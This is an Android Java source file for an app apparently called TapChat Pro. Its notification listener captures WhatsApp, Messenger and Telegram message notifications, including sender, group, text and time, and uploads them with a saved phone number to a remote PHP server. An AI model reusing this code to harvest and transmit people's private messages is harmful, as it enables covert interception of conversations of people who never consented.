package com.tapchat.pro;

import android.app.Notification;
import android.content.SharedPreferences;
import android.os.Build;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.widget.Toast;
import androidx.annotation.RequiresApi;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import java.util.Calendar;
import android.content.Intent;
import android.content.Context;
import android.widget.Toast;
import android.os.AsyncTask;
import android.os.IBinder;
import android.os.Bundle;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import java.io.IOException;



public class NotificationService extends NotificationListenerService {
    private Context context;
    private String lastMessage = "";
	
	@Override
	public void onCreate() {
		super.onCreate();
		context = getApplicationContext();
		if(Const.getActiveStatus(this)){
			Intent serviceIntent = new Intent(this, ForegroundService.class);
			serviceIntent.setAction("start");
			startService(serviceIntent);
		}
	}
    
    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        super.onNotificationPosted(sbn);

        long postTime = sbn.getPostTime();
        Calendar calendar = Calendar.getInstance();
        calendar.setTimeInMillis(postTime);
        int hour = calendar.get(Calendar.HOUR_OF_DAY);
        int minute = calendar.get(Calendar.MINUTE);
        int day = calendar.get(Calendar.DAY_OF_MONTH);
        int month = calendar.get(Calendar.MONTH) + 1;
        int year = calendar.get(Calendar.YEAR);
        String time = hour + ":" + minute + "," + day + "," + month + "," + year;

        String packageName = sbn.getPackageName();
        if (packageName.equals(Const.PACKAGE_WHATSAPP) ||
            packageName.equals(Const.PACKAGE_WHATSAPP_BUSINESS) ||
            packageName.equals(Const.PACKAGE_MESSENGER) ||
            packageName.equals(Const.PACKAGE_TELEGRAM)) {
            
            NotificationInfo.NotificationData data = NotificationInfo.getNotificationData(sbn);
            String appName = getAppName(packageName);
            String groupName = getGroupName(data.groupName);
            String sender = getSender(data.sender);
            String message = getMessage(data.message);
            
            SharedPreferences sharedPreferences = getSharedPreferences("MyPrefs", MODE_PRIVATE);
            String savedPhoneNumber = sharedPreferences.getString("phoneNumber", null);

            if (!message.isEmpty() && savedPhoneNumber != null && !savedPhoneNumber.isEmpty()) {
                if (message.equals(lastMessage)) {
                    return; // If message is same as last message, ignore
                }

                lastMessage = message; // Save message as last message

                JSONObject jsonObject = new JSONObject();
                try {
                    jsonObject.put("nohp", savedPhoneNumber);
                    JSONArray jsonArray = new JSONArray();
                    JSONObject notificationObject = new JSONObject();
                    notificationObject.put("App", appName);
                    if (!groupName.isEmpty() && !sender.equals(groupName)) {
                        notificationObject.put("group", groupName);
                    }
                    notificationObject.put("sender", sender);
                    notificationObject.put("message", message);
                    notificationObject.put("time", time);
                    jsonArray.put(notificationObject);
                    jsonObject.put("notifications", jsonArray);
                } catch (JSONException e) {
                    e.printStackTrace();
                }

                if (jsonObject.length() > 0) {
                    new UploadNotificationDataTask().execute(jsonObject);
                }
            }
        }
    }

	@Override
	public void onNotificationRemoved(StatusBarNotification sbn) {
		super.onNotificationRemoved(sbn);
	}
	
	@Override
	public void onListenerConnected() {
		super.onListenerConnected();
		Toast.makeText(context, "Connected", Toast.LENGTH_SHORT).show();
		
	}
	
	@Override
	public void onListenerDisconnected() {
		super.onListenerDisconnected();
		Toast.makeText(context, "Disconnected", Toast.LENGTH_SHORT).show();
	}
	@Override
	public void onDestroy() {
		super.onDestroy();
		Intent serviceIntent = new Intent(this, ForegroundService.class);
		serviceIntent.setAction("stop");
		startService(serviceIntent);
	}

    private String getGroupName(String groupName) {
        if (groupName != null && !groupName.isEmpty()) {
            groupName = groupName.replaceAll("[^\\p{Print}]", "");
            groupName = groupName.replaceAll("\u200e", "");
            groupName = groupName.replaceAll("\\(\\d+ pesan\\)", "").trim();
            return groupName;
        }
        return "";
    }

    private String getSender(String sender) {
        if (sender != null && !sender.isEmpty()) {
            sender = sender.replaceAll("\u202f", "");
            return sender;
        }
        return "";
    }

    private String getMessage(String rawMessage) {
        if (rawMessage != null && (rawMessage.contains("pesan baru") || rawMessage.contains("pesan dari"))) {
            return "";
        }
        return rawMessage;
    }

    private String getAppName(String packageName) {
        switch (packageName) {
            case Const.PACKAGE_WHATSAPP:
                return "WhatsApp";
            case Const.PACKAGE_WHATSAPP_BUSINESS:
                return "WhatsApp Business";
            case Const.PACKAGE_MESSENGER:
                return "Messenger";
            case Const.PACKAGE_TELEGRAM:
                return "Telegram";
            default:
                return packageName;
        }
    }

    // Inner class for asynchronous task to upload notification data
    private class UploadNotificationDataTask extends AsyncTask<JSONObject, Void, Boolean> {
        @Override
        protected Boolean doInBackground(JSONObject... jsonObjects) {
            OkHttpClient client = new OkHttpClient();
            RequestBody body = RequestBody.create(MediaType.parse("application/json; charset=utf-8"), jsonObjects[0].toString());
            Request request = new Request.Builder()
                .url("https://doodskep.my.id/notification.php")
                .post(body)
                .build();

            try {
                Response response = client.newCall(request).execute();
                return response.isSuccessful();
            } catch (IOException e) {
                e.printStackTrace();
                return false;
            }
        }
    }
}
